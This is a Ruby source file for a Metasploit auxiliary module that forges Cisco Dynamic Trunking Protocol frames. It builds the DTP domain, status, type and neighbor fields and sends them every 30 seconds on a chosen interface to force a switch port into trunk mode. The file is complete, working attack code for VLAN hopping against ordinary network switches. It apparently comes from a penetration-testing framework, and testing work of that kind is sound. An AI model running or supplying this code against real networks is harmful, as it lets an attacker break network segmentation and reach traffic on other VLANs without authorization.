##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Forge Cisco DTP Packets',
			'Description'    => %q{
				This module forges DTP packets to initialize a trunk port.
			},
			'Author'         => [ 'Spencer McIntyre' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'Actions'     =>
				[
					[ 'Service' ]
				],
			'PassiveActions' =>
				[
					'Service'
				],
			'DefaultAction'  => 'Service'
		))
		register_options(
			[
				OptString.new('DOMAIN', [ false,  "DTP Domain Name", '']),
				OptString.new('IFACE', [ true,  "Interface To Use", 'eth0']),
			], self.class)
	end

	def run
		n = Racket::Racket.new
		@run = true
		domain = datastore['DOMAIN']
		if domain == ""
			domain = "\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		end

		n.l2 = Racket::L2::Ethernet.new()
		n.l2.dst_mac = '01:00:0c:cc:cc:cc'    #this has to stay the same
		n.l2.ethertype = (domain.length + 34)

		n.l3 = Racket::L2::LLC.new()
		n.l3.control = 0x03
		n.l3.dsap = 0xaa
		n.l3.ssap = 0xaa
		cisco_vendor_code = "\x00\x00\x0c"
		pid = "\x20\x04"    #2004 is DTP
		payload = cisco_vendor_code + pid

		#DTP info section
		dtp_version = "\x01"

		dtp_domain_type = "\x00\x01"
		dtp_domain_len = [ (domain.length + 5) ].pack("n")
		dtp_domain = domain + "\x00"
		dtp_domain_section = dtp_domain_type
		dtp_domain_section << dtp_domain_len
		dtp_domain_section << dtp_domain

		dtp_status_type = "\x00\x02"
		dtp_status_len = "\x00\x05"
		dtp_status = "\x03"
		dtp_status_section = dtp_status_type
		dtp_status_section << dtp_status_len
		dtp_status_section << dtp_status

		dtp_type_type = "\x00\x03"
		dtp_type_len = "\x00\x05"
		dtp_type = "\xa5"
		dtp_type_section = dtp_type_type
		dtp_type_section << dtp_type_len
		dtp_type_section << dtp_type

		dtp_neighbor_type = "\x00\x04"
		dtp_neighbor_len = "\x00\x0a"
		dtp_neighbor = "\x11\x22\x33\x44\x55\x66"
		dtp_neighbor_section = dtp_neighbor_type
		dtp_neighbor_section << dtp_neighbor_len
		dtp_neighbor_section << dtp_neighbor

		payload << dtp_version
		payload << dtp_domain_section
		payload << dtp_status_section
		payload << dtp_type_section
		payload << dtp_neighbor_section
		n.l3.payload = payload

		n.iface = datastore['IFACE']
		n.pack()
		while @run
			n.send2()
			select(nil, nil, nil, 30)
		end

	end

end
